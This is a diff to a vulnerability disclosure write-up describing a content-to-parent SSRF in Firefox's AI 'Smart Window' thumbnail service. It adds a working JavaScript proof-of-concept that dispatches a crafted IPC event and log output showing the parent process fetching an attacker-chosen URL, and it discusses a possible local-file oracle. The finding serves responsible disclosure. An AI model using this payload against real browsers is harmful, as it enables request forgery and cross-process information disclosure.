@@ -1,11 +1,12 @@
 # Finding 01 — Content→parent SSRF / info-disclosure via unvalidated thumbnail URL in Firefox "Smart Window" (AI window)
 
-**Status:** **SSRF primitive reproduced live** on the official Mozilla ASAN build
-(Firefox 157.0a1, BuildID 20260909083822, `linux64-asan-opt`). The parent process
-was driven to issue HTTP requests to an attacker-controlled URL via the exact Smart
-Window sink; see [Confirmed reproduction](#confirmed-reproduction) and
-`poc/EVIDENCE.txt`. The full content→parent IPC transport and the local-file oracle
-are analyzed but not fully driven end-to-end (see notes).
+**Status:** **Full content→parent SSRF reproduced live, end-to-end** on the official
+Mozilla ASAN build (Firefox 157.0a1, BuildID 20260909083822, `linux64-asan-opt`).
+Ordinary content-page script in `about:aichatcontent` (no user gesture) drives the
+parent process to fetch an attacker-controlled URL through the real
+`AIChatContent:RequestAssets` IPC path. See [Confirmed reproduction](#confirmed-reproduction)
+and `poc/EVIDENCE.txt`. The `file://` local-image oracle is analyzed but was not landed
+cleanly in the headless test environment (see notes).
 **Component:** `browser/components/aiwindow` (Smart Window / AI window), thumbnail service.
 **Class:** Content-process → parent-process SSRF + cross-process information-disclosure
 (unvalidated URL reaches a system-principal load).
@@ -227,19 +228,46 @@ listener: GET /ssrf-final-1788954484 from 127.0.0.1
 The parent process fetched the attacker-controlled URL and returned a content-reachable
 `moz-page-thumb://` result. This is the SSRF primitive, live.
 
-**What this does and does not show (honest scoping):**
-- ✅ The vulnerable sink (`captureThumbnail`, the exact call `#handleRequestAssets`
-  makes on attacker-controlled `thumbnail`) drives the **parent** process to fetch an
-  arbitrary attacker URL, on a stock Mozilla ASAN build with default thumbnail prefs.
-- ◻️ The IPC transport step (`AIChatContent:RequestAssets` sent from a compromised
-  `privilegedabout` content process) was **not** driven; the parent handler passes
-  message `data` verbatim to `#handleRequestAssets` with no validation (source-verified),
-  so the direct call faithfully reproduces the handler's behavior on attacker IPC data.
+### End-to-end via the real IPC path (content-page script → parent SSRF)
+
+Stronger reproduction driving the **actual `AIChatContent:RequestAssets` IPC**, not the
+sink directly. Marionette in **content context** navigates to `about:aichatcontent`
+(loads standalone in the `privilegedabout` process) and, as **ordinary page script**
+(content principal, no chrome access, no user gesture), dispatches the DOM event the
+child actor forwards to the parent:
+
+```js
+const detail = { conversationId:"poc-e2e", messageId:"poc-e2e",
+  items:[{ url:"http://127.0.0.1:8899/ignored",
+           thumbnail:"http://127.0.0.1:8899/ipc-e2e-<ts>" }] };
+target.dispatchEvent(new CustomEvent("AIChatContent:RequestAssets",
+                     { detail, bubbles:true, composed:true }));
+```
+
+The actor registers `RequestAssets` with **`wantUntrusted: true`**, so this untrusted
+page-script event is delivered → `AIChatContentChild.handleEvent` →
+`sendAsyncMessage` → `AIChatContentParent.#handleRequestAssets` →
+`captureThumbnail(thumbnail)`.
+
+```
+dispatch: {'dispatchedOn':'ai-chat-content','url':'about:aichatcontent','hasChatContent':True}
+listener: GET /ipc-e2e-1788954754 from 127.0.0.1     <-- PARENT fetched the attacker URL
+```
+
+**What this shows (honest scoping):**
+- ✅ The **complete content→parent boundary crossing** via the real IPC path drives the
+  parent process to fetch an arbitrary attacker URL, on a stock Mozilla ASAN build with
+  default prefs, triggered by **content-scope script with no user interaction**
+  (`wantUntrusted:true`).
+- Getting script into the privileged `about:aichatcontent` document still requires an
+  injection/UXSS in that page or a compromised `privilegedabout` content process — page
+  script is not normally attacker-controlled. This is the real precondition and is stated
+  plainly for the committee.
 - ◻️ The **`file://` local-image oracle** was attempted but the background-thumbnail
   capture hung in the headless test environment (a capture-queue/gfx artifact, not a
   security control); no clean positive local-file disclosure was landed here. SSRF is
-  confirmed; the local-file oracle remains plausible per the code path but unproven in
-  this run.
+  confirmed end-to-end; the local-file oracle remains plausible per the code path but
+  unproven in this run.
 
 ## PoC steps to confirm in a build (ASAN/debug Nightly)
 
